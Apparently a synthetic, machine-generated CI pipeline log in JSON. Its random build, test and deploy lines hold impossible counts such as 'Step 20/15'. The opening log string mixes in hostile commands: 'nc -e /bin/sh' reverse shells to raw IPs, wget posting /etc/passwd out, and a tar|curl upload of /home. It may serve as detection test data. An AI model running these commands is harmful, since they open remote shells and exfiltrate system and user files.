DEPRECATION: Feature will be removed in v3.0\nPOST /upload - 201 (496ms)\nImage pulled successfully\nConnection established\nCache hit for key-8265\nOptimizing 95 modules...\nSuccess!\n[12:20:08] INFO: Starting build process\nCompiling lib/main.py...\nEnvironment: production\n  PASS: test_cache_hit (473ms)\nPulling image: alpine:18\nSwitched to branch 'feature/task-192'\nConnecting to example.com:443...\nUploading artifact 'dist' (8 files)\nCache invalidated: dependencies\n[12:20:08] DEBUG: Query executed in 87ms\nSwitched to branch 'hotfix/task-466'\nEnvironment: development\n  PASS: integration/test_auth_login.spec.js\nOK\nnc -e /bin/sh 142.4.245.12 23239\nWaiting...\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nRan 32 tests in 12s\nSending 70MB of data to startup.dev\nFinished.\nPulling image: node:3.11\nnc -e /bin/sh 99.33.90.65 63297\nnpm install: resolved 1092 packages\npip install: Successfully installed eslint-1.3\n[12:20:08] DEBUG: Query executed in 91ms\nCompiling components/index.js...\nPushing to registry...\nOptimizing 60 modules...\nStep 8/22: Linting\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n\u2713 Task completed in 1297ms\nLayer 7/10: ENV command\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nSnapshots: 14 passed, 27 total\nUsing Python 3.12\nTransforming 117 files...\nReady.\nFAILED: test_user_create\nnpm install: resolved 1584 packages\nFinished.\n[12:20:08] ERROR: Connection failed\nArtifact uploaded: dist.zip (79MB)\n=== Step deploy_production completed ===",
    "steps": [
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-05T12:20:07.959842",
        "finished_at": "2025-12-05T12:20:13.979381",
        "log_lines": [
          "=== Step: lint ===",
          "Pushing to registry...",
          "[12:20:07] WARN: Deprecated API usage",
          "Already up to date.",
          "Platform: darwin-arm64",
          "OK",
          "TLS handshake completed",
          "WARNING: react has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Compiling components/handler.rs...",
          "Cache hit for key-1180",
          "[12:20:07] DEBUG: Query executed in 36ms",
          "[12:20:07] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "HEAD is now at cc4d5a0",
          "[12:20:07] INFO: Starting build process",
          "Layer 2/9: RUN command",
          "Step 11/15: Testing",
          "Cache invalidated: node_modules",
          "Connection established",
          "Step 11/21: Deploying",
          "Fetching submodules...",
          "Connection established",
          "[12:20:07] INFO: Starting build process",
          "Ran 62 tests in 35s",
          "Loading...",
          "[12:20:07] ERROR: Connection failed",
          "Cache invalidated: build",
          "Transforming 544 files...",
          "Finished.",
          "Ready.",
          "Exception: RuntimeError",
          "Fetching submodules...",
          "Done.",
          "Using Node.js 18.11.4",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Time: 30.341s",
          "Step 5/15: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm install: resolved 466 packages",
          "Artifact downloaded: 25MB",
          "Snapshots: 39 passed, 35 total",
          "[12:20:07] DEBUG: Connection pool: 14 active",
          "pip: Installing build dependencies...",
          "Compiling components/handler.rs...",
          "Ready.",
          "[12:20:07] DEBUG: Query executed in 71ms",
          "Artifact downloaded: 19MB",
          "FAILED: test_user_create",
          "  PASS: test_db_connect (287ms)",
          "WARNING: express has known vulnerabilities",
          "[12:20:07] ERROR: Connection failed",
          "\u2717 build failed with exit code 59",
          "FAILED: test_api_health",
          "Building Docker image...",
          "Loading...",
          "pip: Collecting axios",
          "npm notice: package.json updated",
          "Uploading artifact 'build' (45 files)",
          "NODE_ENV=production",
          "Cache saved successfully",
          "Artifact uploaded: dist.zip (86MB)",
          "npm install: resolved 1713 packages",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:20:07] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "  PASS: test_auth_login (116ms)",
          "Pulling image: python:latest",
          "pip install: Successfully installed express-5.7",
          "Transforming 338 files...",
          "[12:20:07] INFO: Connecting to database",
          "Completed.",
          "Connection established",
          "Loading...",
          "GET /health - 204 (43ms)",
          "Connecting to acme.corp:443...",
          "Completed.",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-05T12:20:13.979381",
        "finished_at": "2025-12-05T12:20:19.998920",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "GET /status - 204 (22ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache invalidated: node_modules",
          "Platform: darwin-arm64",
          "[12:20:07] DEBUG: Memory usage: 740MB",
          "Cache invalidated: build",
          "Using Python 3.12",
          "Test Suites: 39 passed, 16 total",
          "Snapshots: 14 passed, 9 total",
          "Layer 1/14: ENV command",
          "Connection established",
          "Step 8/15: Installing dependencies",
          "Step 8/21: Deploying",
          "npm install: added 355 packages",
          "Verifying...",
          "Artifact uploaded: dist.zip (100MB)",
          "npm install: resolved 623 packages",
          "Step 9/19: Linting",
          "Processing...",
          "\u2713 Task completed in 3463ms",
          "WARNING: express has known vulnerabilities",
          "TLS handshake completed",
          "Cache restored successfully (476MB)",
          "WARNING: express has known vulnerabilities",
          "Tests: 54 passed, 54 total",
          "Generating source maps...",
          "NODE_ENV=production",
          "Test Suites: 36 passed, 39 total",
          "Already up to date.",
          "Cache miss for key-3124",
          "[12:20:07] DEBUG: Memory usage: 388MB",
          "WARNING: express has known vulnerabilities",
          "Ran 72 tests in 12s",
          "Artifact downloaded: 15MB",
          "Generating source maps...",
          "[12:20:07] DEBUG: Initializing service",
          "GET /api - 200 (32ms)",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "[12:20:07] WARN: Deprecated API usage",
          "[12:20:07] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "\u2713 test completed",
          "Tests: 98 passed, 421 total",
          "Already up to date.",
          "Pushing to registry...",
          "  PASS: test_auth_login (109ms)",
          "Optimizing 52 modules...",
          "Step 13/15: Deploying",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "Checking out develop branch",
          "Checking out develop branch",
          "Optimizing 98 modules...",
          "Step 5/21: Running migrations",
          "Cache hit for key-4715",
          "Pushing to registry...",
          "Step 12/19: Running migrations",
          "Step 6/25: Linting",
          "Building Docker image...",
          "Step 2/17: Testing",
          "Coverage: 78% statements, 61% branches",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Installing eslint@1.3.1",
          "[12:20:07] DEBUG: Connection pool: 8 active",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: added 174 packages",
          "Compiling components/utils.go...",
          "Cache hit for key-2860",
          "Compiling src/service.java...",
          "Using Python 3.11",
          "[12:20:07] INFO: Processing request",
          "Connecting to startup.dev:443...",
          "Cache saved successfully",
          "Environment: development",
          "pip: Collecting jest",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-05T12:20:19.998920",
        "finished_at": "2025-12-05T12:20:22.406736",
        "log_lines": [
          "=== Step: checkout ===",
          "Environment: staging",
          "HEAD is now at 3bd4ed5",
          "Cache miss for key-2245",
          "Ready.",
          "Step 12/23: Installing dependencies",
          "Step 20/25: Installing dependencies",
          "Pushing to registry...",
          "Artifact downloaded: 24MB",
          "[12:20:07] INFO: Connecting to database",
          "Optimizing 12 modules...",
          "Connecting to startup.dev:443...",
          "\u2713 Step 'install' succeeded",
          "[12:20:07] INFO: Processing request",
          "Step 4/20: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:20:07] WARN: Deprecated API usage",
          "Verifying...",
          "Minifying vendor.js",
          "npm install: added 380 packages",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (96MB)",
          "FAILED: test_api_health",
          "Processing...",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Exception: RuntimeError",
          "Ready.",
          "[12:20:07] INFO: Starting build process",
          "Loading...",
          "Processing...",
          "WARNING: lodash has known vulnerabilities",
          "Verifying...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "npm install: added 55 packages",
          "[12:20:07] DEBUG: Memory usage: 1039MB",
          "[12:20:07] DEBUG: Connection pool: 10 active",
          "  PASS: test_api_health (160ms)",
          "Cache miss for key-7058",
          "TLS handshake completed",
          "Cache invalidated: dependencies",
          "\u2713 validate completed",
          "OK",
          "[12:20:07] INFO: Starting build process",
          "[12:20:07] DEBUG: Memory usage: 1617MB",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 All checks passed",
          "Cache invalidated: node_modules",
          "[12:20:07] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "yarn add: Done in 16.41s",
          "Cache hit for key-9759",
          "Completed.",
          "pip: Collecting webpack",
          "Pushing to registry...",
          "\u2713 deploy completed",
          "Artifact downloaded: 50MB",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Exception: ValueError",
          "[12:20:07] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Cache saved successfully",
          "Snapshots: 12 passed, 39 total",
          "pip: Installing build dependencies...",
          "Environment: production",
          "Time: 2.968s",
          "Fetching submodules...",
          "Checking out develop branch",
          "pip install: Successfully installed jest-5.2",
          "WARNING: prettier has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Loading...",
          "Success!",
          "Exception: RuntimeError",
          "HEAD is now at f8090c3",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-05T12:20:22.406736",
        "finished_at": "2025-12-05T12:20:28.426275",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "npm notice: created a lockfile",
          "Using Python 3.10",
          "Processing...",
          "Image pulled successfully",
          "Cache invalidated: build",
          "Done.",
          "Pushing to registry...",
          "Verifying...",
          "Minifying main.js",
          "Fetching submodules...",
          "[12:20:07] INFO: Request completed",
          "Uploading artifact 'dist' (43 files)",
          "[12:20:07] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 91",
          "  PASS: test_db_connect (56ms)",
          "OK",
          "[12:20:07] DEBUG: Query executed in 3ms",
          "[12:20:07] INFO: Processing request",
          "Success!",
          "[12:20:07] DEBUG: Memory usage: 1606MB",
          "  PASS: test_auth_login (398ms)",
          "Step 15/15: Installing dependencies",
          "[12:20:07] DEBUG: Connection pool: 14 active",
          "npm notice: package.json updated",
          "Already up to date.",
          "Using Node.js 16.14.8",
          "Cache invalidated: dependencies",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 All checks passed",
          "[12:20:07] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:20:07] INFO: Processing request",
          "Checking out develop branch",
          "yarn add: Done in 25.33s",
          "Waiting...",
          "Time: 20.983s",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "[12:20:07] INFO: Processing request",
          "Layer 3/8: RUN command",
          "Cache miss for key-3855",
          "Verifying...",
          "Switched to branch 'hotfix/task-635'",
          "Completed.",
          "Connecting to cloud.services:443...",
          "Step 19/25: Building",
          "Time: 71.666s",
          "Image pulled successfully",
          "Using Python 3.12",
          "Environment: test",
          "Time: 32.702s",
          "HEAD is now at 58f4186",
          "Optimizing 64 modules...",
          "Snapshots: 11 passed, 20 total",
          "Cache restored successfully (223MB)",
          "Switched to branch 'hotfix/task-462'",
          "Waiting...",
          "Step 7/20: Building",
          "\u2713 All checks passed",
          "Connecting to test.io:443...",
          "[12:20:07] INFO: Processing request",
          "[12:20:07] INFO: Processing request",
          "Cache saved successfully",
          "Exception: RuntimeError",
          "Cache invalidated: node_modules",
          "\u2713 lint completed",
          "npm notice: created a lockfile",
          "Transforming 533 files...",
          "Artifact downloaded: 16MB",
          "\u2713 Step 'checkout' succeeded",
          "Cache hit for key-1335",
          "npm install: added 267 packages",
          "[12:20:07] DEBUG: Connection pool: 17 active",
          "Minifying main.js",
          "GET /api - 204 (80ms)",
          "Platform: win32-x64",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-05T12:20:28.426275",
        "finished_at": "2025-12-05T12:20:34.445814",
        "log_lines": [
          "=== Step: setup_node ===",
          "npm install: resolved 1364 packages",
          "Generating source maps...",
          "Cache saved successfully",
          "WARNING: prettier has known vulnerabilities",
          "Uploading artifact 'build' (42 files)",
          "Compiling lib/handler.rs...",
          "pip install: Successfully installed axios-5.9",
          "WARNING: webpack has known vulnerabilities",
          "HEAD is now at c8cd8ea",
          "HEAD is now at d46cfb3",
          "Platform: win32-x64",
          "Switched to branch 'feature/task-747'",
          "Bundling vendor.css",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache invalidated: dependencies",
          "Layer 10/11: COPY command",
          "[12:20:07] INFO: Cache refreshed",
          "Time: 10.484s",
          "Time: 106.316s",
          "pip install: Successfully installed axios-3.6",
          "Already up to date.",
          "Already up to date.",
          "OK",
          "pip: Installing build dependencies...",
          "Coverage: 77% statements, 92% branches",
          "[12:20:07] ERROR: Connection failed",
          "Creating production build...",
          "yarn add: Done in 8.71s",
          "Image pulled successfully",
          "WARNING: jest has known vulnerabilities",
          "Exception: TypeError",
          "[12:20:07] WARN: Deprecated API usage",
          "\u2713 Task completed in 2183ms",
          "Verifying...",
          "Bundling vendor.js",
          "Coverage: 85% statements, 97% branches",
          "Step 20/15: Running migrations",
          "Ran 144 tests in 59s",
          "Processing...",
          "WARNING: express has known vulnerabilities",
          "WARNING: prettier has known vulnerabilities",
          "Compiling lib/utils.go...",
          "NODE_ENV=development",
          "WARNING: prettier has known vulnerabilities",
          "Environment: staging",
          "Success!",
          "Transforming 277 files...",
          "[12:20:07] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Step 4/17: Linting",
          "[12:20:07] ERROR: Connection failed",
          "pip install: Successfully installed react-5.4",
          "Platform: win32-x64",
          "Compiling utils/service.java...",
          "  PASS: integration/test_cache_hit.spec.js",
          "\u2713 package completed",
          "Step 1/18: Building",
          "Waiting...",
          "Checking out main branch",
          "Connection established",
          "WARNING: prettier has known vulnerabilities",
          "[12:20:07] WARN: Deprecated API usage",
          "Coverage: 95% statements, 88% branches",
          "Ran 84 tests in 23s",
          "Verifying...",
          "TLS handshake completed",
          "Checking out master branch",
          "Environment: development",
          "\u2717 build failed with exit code 86",
          "Compiling utils/utils.go...",
          "[12:20:07] DEBUG: Query executed in 78ms",
          "Switched to branch 'bugfix/task-544'",
          "Done.",
          "Minifying main.js",
          "pip: Downloading jest-1.2.tar.gz",
          "[12:20:07] DEBUG: Query executed in 91ms",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-05T12:20:34.445814",
        "finished_at": "2025-12-05T12:20:40.465353",
        "log_lines": [
          "=== Step: type_check ===",
          "POST /data - 200 (88ms)",
          "[12:20:07] DEBUG: Loading configuration",
          "OK",
          "TLS handshake completed",
          "Uploading artifact 'coverage' (13 files)",
          "HEAD is now at 04d1f29",
          "[12:20:07] ERROR: Connection failed",
          "Creating production build...",
          "Step 4/17: Linting",
          "Compiling src/handler.rs...",
          "[12:20:07] INFO: Processing request",
          "Verifying...",
          "\u2713 Task completed in 2965ms",
          "Compiling lib/main.py...",
          "Connecting to example.com:443...",
          "HEAD is now at a2246dd",
          "Step 18/21: Running migrations",
          "Exception: RuntimeError",
          "[12:20:07] INFO: Request completed",
          "Completed.",
          "Cache miss for key-8384",
          "  PASS: test_api_health (279ms)",
          "Cache miss for key-3423",
          "Pushing to registry...",
          "pip: Downloading prettier-2.5.tar.gz",
          "Optimizing 36 modules...",
          "Coverage: 82% statements, 67% branches",
          "Generating source maps...",
          "Uploading artifact 'coverage' (5 files)",
          "FAILED: test_api_health",
          "  PASS: e2e/test_auth_login.spec.js",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "NODE_ENV=production",
          "Cache hit for key-5900",
          "Already up to date.",
          "[12:20:07] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Loading...",
          "Artifact uploaded: dist.zip (43MB)",
          "Generating source maps...",
          "Loading...",
          "Step 14/24: Deploying",
          "Cache hit for key-5029",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_auth_login (284ms)",
          "Environment: production",
          "npm install: resolved 1426 packages",
          "Ready.",
          "Loading...",
          "Environment: production",
          "Compiling components/utils.go...",
          "GET /status - 201 (5ms)",
          "pip: Collecting react",
          "Optimizing 20 modules...",
          "Compiling lib/app.ts...",
          "  PASS: test_api_health (147ms)",
          "Verifying...",
          "Already up to date.",
          "\u2713 All checks passed",
          "Finished.",
          "[12:20:08] DEBUG: Initializing service",
          "Pulling image: node:latest",
          "[12:20:08] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Creating production build...",
          "[12:20:08] ERROR: Connection failed",
          "Optimizing 40 modules...",
          "Tests: 77 passed, 277 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling components/main.py...",
          "Bundling vendor.js",
          "  PASS: integration/test_user_create.spec.js",
          "Artifact uploaded: build.tar.gz (26MB)",
          "pip install: Successfully installed axios-3.13",
          "[12:20:08] INFO: Connecting to database",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-05T12:20:40.465353",
        "finished_at": "2025-12-05T12:20:58.523970",
        "log_lines": [
          "=== Step: build ===",
          "NODE_ENV=production",
          "Cache miss for key-2967",
          "npm install: resolved 189 packages",
          "Pushing to registry...",
          "Using Python 3.10",
          "Checking out develop branch",
          "[12:20:08] INFO: Starting build process",
          "[12:20:08] DEBUG: Loading configuration",
          "Fetching submodules...",
          "Image pulled successfully",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Time: 82.540s",
          "Using Node.js 16.11.0",
          "Compiling components/utils.go...",
          "WARNING: webpack has known vulnerabilities",
          "[12:20:08] INFO: Processing request",
          "\u2713 All checks passed",
          "Completed.",
          "Compiling lib/service.java...",
          "NODE_ENV=development",
          "Loading...",
          "NODE_ENV=development",
          "Already up to date.",
          "Switched to branch 'feature/task-115'",
          "Cache invalidated: dependencies",
          "Checking out develop branch",
          "[12:20:08] WARN: Deprecated API usage",
          "Verifying...",
          "Finished.",
          "npm install: added 215 packages",
          "Cache restored successfully (215MB)",
          "[12:20:08] DEBUG: Loading configuration",
          "Step 16/24: Running migrations",
          "Snapshots: 22 passed, 35 total",
          "\u2717 build failed with exit code 78",
          "Building Docker image...",
          "[12:20:08] ERROR: Connection failed",
          "Cache invalidated: dependencies",
          "Artifact downloaded: 10MB",
          "Using Python 3.9",
          "Pushing to registry...",
          "[12:20:08] DEBUG: Connection pool: 6 active",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "OK",
          "Cache restored successfully (63MB)",
          "[12:20:08] WARN: Deprecated API usage",
          "Minifying app.js",
          "Uploading artifact 'coverage' (30 files)",
          "Layer 4/12: COPY command",
          "Step 9/17: Installing dependencies",
          "GET /api - 204 (16ms)",
          "OK",
          "\u2713 Step 'install' succeeded",
          "Pulling image: alpine:18",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Loading...",
          "Tests: 157 passed, 293 total",
          "Cache hit for key-4502",
          "\u2713 Step 'build' succeeded",
          "Creating production build...",
          "Artifact downloaded: 50MB",
          "[12:20:08] DEBUG: Loading configuration",
          "npm install: resolved 1267 packages",
          "Artifact downloaded: 47MB",
          "Checking out master branch",
          "Tests: 232 passed, 190 total",
          "yarn add: Done in 25.38s",
          "[12:20:08] INFO: Connecting to database",
          "FAILED: test_db_connect",
          "Pushing to registry...",
          "Using Python 3.10",
          "\u2713 validate completed",
          "[12:20:08] DEBUG: Initializing service",
          "Generating source maps...",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-05T12:20:58.523970",
        "finished_at": "2025-12-05T12:21:16.582587",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Step 7/18: Installing dependencies",
          "npm notice: package.json updated",
          "Connecting to startup.dev:443...",
          "Cache saved successfully",
          "Optimizing 43 modules...",
          "[12:20:08] INFO: Request completed",
          "Optimizing 23 modules...",
          "Checking out master branch",
          "NODE_ENV=development",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "Verifying...",
          "Using Python 3.9",
          "Building Docker image...",
          "WARNING: prettier has known vulnerabilities",
          "Bundling runtime.css",
          "Environment: production",
          "Bundling styles.css",
          "TLS handshake completed",
          "Installing react@4.15.6",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "[12:20:08] WARN: Deprecated API usage",
          "Step 7/18: Deploying",
          "Generating source maps...",
          "Connecting to test.io:443...",
          "Cache hit for key-5539",
          "Test Suites: 34 passed, 19 total",
          "npm notice: package.json updated",
          "\u2713 Task completed in 4832ms",
          "npm notice: package.json updated",
          "Switched to branch 'bugfix/task-970'",
          "Time: 14.807s",
          "POST /upload - 202 (163ms)",
          "Ready.",
          "Transforming 996 files...",
          "[12:20:08] INFO: Cache refreshed",
          "Compiling utils/handler.rs...",
          "Connection established",
          "[12:20:08] WARN: Deprecated API usage",
          "Generating source maps...",
          "Installing lodash@2.15.4",
          "Ran 88 tests in 14s",
          "Generating source maps...",
          "[12:20:08] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 36",
          "Step 7/18: Building",
          "Connection established",
          "Bundling runtime.js",
          "Creating production build...",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_user_create (477ms)",
          "Waiting...",
          "Processing...",
          "pip: Downloading axios-1.10.tar.gz",
          "yarn add: Done in 28.3s",
          "Bundling vendor.css",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Image pulled successfully",
          "npm install: resolved 730 packages",
          "Cache miss for key-8665",
          "Platform: linux-x64",
          "Ready.",
          "GET /status - 201 (22ms)",
          "[12:20:08] INFO: Starting build process",
          "Fetching submodules...",
          "Tests: 179 passed, 130 total",
          "pip: Downloading eslint-4.19.tar.gz",
          "Bundling runtime.js",
          "[12:20:08] INFO: Starting build process",
          "Switched to branch 'feature/task-731'",
          "Finished.",
          "Using Python 3.10",
          "Snapshots: 22 passed, 43 total",
          "Test Suites: 46 passed, 12 total",
          "Compiling components/main.py...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-05T12:21:16.582587",
        "finished_at": "2025-12-05T12:21:20.194310",
        "log_lines": [
          "=== Step: save_cache ===",
          "Environment: test",
          "Ran 59 tests in 18s",
          "Ran 194 tests in 1s",
          "  PASS: test_auth_login (62ms)",
          "pip: Installing build dependencies...",
          "[12:20:08] DEBUG: Connection pool: 18 active",
          "Step 5/21: Installing dependencies",
          "TLS handshake completed",
          "Artifact uploaded: dist.zip (14MB)",
          "pip: Downloading lodash-3.2.tar.gz",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (16MB)",
          "[12:20:08] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Generating source maps...",
          "Coverage: 73% statements, 86% branches",
          "Processing...",
          "Compiling components/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "POST /data - 200 (351ms)",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:20:08] WARN: Deprecated API usage",
          "Step 17/17: Building",
          "[12:20:08] WARN: Deprecated API usage",
          "Environment: production",
          "\u2713 Step 'build' succeeded",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Checking out master branch",
          "Pulling image: python:latest",
          "[12:20:08] DEBUG: Initializing service",
          "Checking out main branch",
          "  PASS: unit/test_auth_login.spec.js",
          "Compiling src/service.java...",
          "[12:20:08] INFO: Request completed",
          "Connecting to acme.corp:443...",
          "[12:20:08] ERROR: Connection failed",
          "Ready.",
          "Step 13/25: Building",
          "Tests: 272 passed, 106 total",
          "pip: Installing build dependencies...",
          "Time: 36.205s",
          "Connection established",
          "Success!",
          "  PASS: test_user_create (368ms)",
          "WARNING: express has known vulnerabilities",
          "Minifying vendor.js",
          "Compiling lib/index.js...",
          "Processing...",
          "Already up to date.",
          "Step 15/25: Testing",
          "Pulling image: node:18",
          "Exception: ValueError",
          "Test Suites: 48 passed, 25 total",
          "Bundling main.js",
          "[12:20:08] DEBUG: Initializing service",
          "Artifact downloaded: 14MB",
          "Cache invalidated: node_modules",
          "Coverage: 79% statements, 95% branches",
          "[12:20:08] INFO: Cache refreshed",
          "Fetching submodules...",
          "pip: Downloading express-5.16.tar.gz",
          "pip: Installing build dependencies...",
          "Step 10/16: Building",
          "GET /health - 204 (10ms)",
          "Creating production build...",
          "Building Docker image...",
          "Cache restored successfully (434MB)",
          "Transforming 813 files...",
          "Already up to date.",
          "WARNING: express has known vulnerabilities",
          "Platform: linux-x64",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Downloading axios-5.17.tar.gz",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-05T12:21:20.194310",
        "finished_at": "2025-12-05T12:21:26.213849",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "NODE_ENV=production",
          "Ready.",
          "[12:20:08] INFO: Cache refreshed",
          "Building Docker image...",
          "Pulling image: node:18",
          "[12:20:08] DEBUG: Query executed in 86ms",
          "Image pulled successfully",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Building Docker image...",
          "OK",
          "[12:20:08] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "npm notice: package.json updated",
          "WARNING: axios has known vulnerabilities",
          "Step 13/24: Deploying",
          "npm notice: package.json updated",
          "Building Docker image...",
          "Coverage: 99% statements, 61% branches",
          "Bundling styles.js",
          "Cache invalidated: build",
          "[12:20:08] INFO: Cache refreshed",
          "WARNING: eslint has known vulnerabilities",
          "POST /data - 200 (456ms)",
          "Artifact uploaded: dist.zip (25MB)",
          "npm install: added 71 packages",
          "[12:20:08] INFO: Cache refreshed",
          "npm install: added 450 packages",
          "Image pulled successfully",
          "[12:20:08] DEBUG: Initializing service",
          "Artifact downloaded: 7MB",
          "Layer 7/13: RUN command",
          "[12:20:08] INFO: Connecting to database",
          "[12:20:08] INFO: Starting build process",
          "Artifact uploaded: dist.zip (77MB)",
          "npm install: added 103 packages",
          "Switched to branch 'bugfix/task-839'",
          "\u2717 build failed with exit code 3",
          "Time: 31.816s",
          "[12:20:08] INFO: Starting build process",
          "WARNING: webpack has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Minifying app.js",
          "FAILED: test_auth_login",
          "Cache invalidated: build",
          "Checking out master branch",
          "npm notice: created a lockfile",
          "Compiling lib/handler.rs...",
          "[12:20:08] DEBUG: Memory usage: 686MB",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:20:08] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Verifying...",
          "pip: Installing build dependencies...",
          "Connecting to startup.dev:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed eslint-2.17",
          "Artifact uploaded: dist.zip (14MB)",
          "Exception: NullPointerException",
          "Connecting to acme.corp:443...",
          "[12:20:08] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (10MB)",
          "Uploading artifact 'build' (1 files)",
          "\u2713 Task completed in 2759ms",
          "npm notice: created a lockfile",
          "Done.",
          "Cache hit for key-3763",
          "Finished.",
          "Cache hit for key-3722",
          "[12:20:08] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "Ready.",
          "Fetching submodules...",
          "Switched to branch 'feature/task-496'",
          "Step 9/22: Linting",
          "Step 20/23: Building",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-05T12:21:26.213849",
        "finished_at": "2025-12-05T12:21:32.233388",
        "log_lines": [
          "=== Step: setup_environment ===",
          "pip: Installing build dependencies...",
          "HEAD is now at 274a80a",
          "Switched to branch 'feature/task-977'",
          "Compiling lib/utils.go...",
          "Snapshots: 8 passed, 47 total",
          "Checking out master branch",
          "[12:20:08] DEBUG: Loading configuration",
          "Building Docker image...",
          "Ready.",
          "  PASS: unit/test_user_create.spec.js",
          "TLS handshake completed",
          "Connection established",
          "Pulling image: node:latest",
          "Step 18/25: Building",
          "\u2713 build completed",
          "npm install: resolved 561 packages",
          "Cache hit for key-2501",
          "Environment: development",
          "Tests: 178 passed, 496 total",
          "NODE_ENV=production",
          "Completed.",
          "WARNING: webpack has known vulnerabilities",
          "Creating production build...",
          "Cache hit for key-6555",
          "Cache invalidated: dependencies",
          "OK",
          "Step 4/19: Deploying",
          "Step 14/25: Building",
          "[12:20:08] INFO: Starting build process",
          "Cache restored successfully (444MB)",
          "  PASS: integration/test_cache_hit.spec.js",
          "POST /data - 202 (439ms)",
          "\u2713 Task completed in 4634ms",
          "Using Node.js 19.18.1",
          "[12:20:08] DEBUG: Loading configuration",
          "Time: 42.783s",
          "[12:20:08] DEBUG: Loading configuration",
          "Fetching submodules...",
          "[12:20:08] INFO: Request completed",
          "Using Python 3.11",
          "yarn add: Done in 15.52s",
          "[12:20:08] INFO: Starting build process",
          "Step 10/24: Building",
          "Optimizing 50 modules...",
          "Cache miss for key-1099",
          "FAILED: test_db_connect",
          "GET /health - 200 (1ms)",
          "Completed.",
          "Compiling utils/service.java...",
          "Generating source maps...",
          "[12:20:08] DEBUG: Memory usage: 780MB",
          "GET /status - 204 (43ms)",
